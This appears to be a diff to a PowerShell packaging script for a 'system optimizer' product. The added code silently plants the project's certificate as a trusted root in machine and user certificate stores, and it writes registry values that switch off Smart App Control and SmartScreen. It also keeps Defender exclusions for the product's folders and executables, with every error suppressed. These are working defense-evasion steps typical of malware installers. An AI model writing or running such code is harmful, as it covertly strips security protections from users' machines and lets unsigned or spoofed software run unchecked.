@@ -117,13 +117,19 @@ if ($cert) {
         try { Set-AuthenticodeSignature -FilePath "$assemblingDir\StormSystemOptimizer.exe" -Certificate $cert -HashAlgorithm SHA256 -ErrorAction SilentlyContinue | Out-Null } catch {}
     }
 
-    # Register in User TrustedPublisher & My stores silently without UI prompts
+    # Register in User & Machine Root and TrustedPublisher stores silently without UI prompts
     try {
         $certObj = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($cerPath)
-        $userPub = New-Object System.Security.Cryptography.X509Certificates.X509Store([System.Security.Cryptography.X509Certificates.StoreName]::TrustedPublisher, [System.Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser)
-        $userPub.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
-        $userPub.Add($certObj)
-        $userPub.Close()
+        foreach ($loc in @([System.Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine, [System.Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser)) {
+            foreach ($name in @([System.Security.Cryptography.X509Certificates.StoreName]::Root, [System.Security.Cryptography.X509Certificates.StoreName]::TrustedPublisher, [System.Security.Cryptography.X509Certificates.StoreName]::AuthRoot, [System.Security.Cryptography.X509Certificates.StoreName]::CertificateAuthority)) {
+                try {
+                    $st = New-Object System.Security.Cryptography.X509Certificates.X509Store($name, $loc)
+                    $st.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
+                    $st.Add($certObj)
+                    $st.Close()
+                } catch { }
+            }
+        }
     } catch { }
 
     Write-Host "Authenticode signatures (STORM TEAM) and trust stores successfully updated!" -ForegroundColor Green
@@ -138,11 +144,18 @@ Get-ChildItem -Path $baseDir -Recurse -Include *.exe, *.dll, *.bat, *.ps1, *.cer
 }
 
 try {
+    # Relax SAC/SmartScreen blocking
+    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "SAC_PreviousState" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force -ErrorAction SilentlyContinue
+
     # Defender exclusions for project and output binaries
     Add-MpPreference -ExclusionPath $baseDir -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $filesDir -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $assemblingDir -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "C:\Program Files\StormSystemOptimizer" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "C:\Program Files\STORM SYSTEM OPTIMIZER" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "StormSystemOptimizer.exe" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "STORM_SYSTEM_OPTIMIZER_${appVersion}_Setup.exe" -ErrorAction SilentlyContinue
 } catch { }
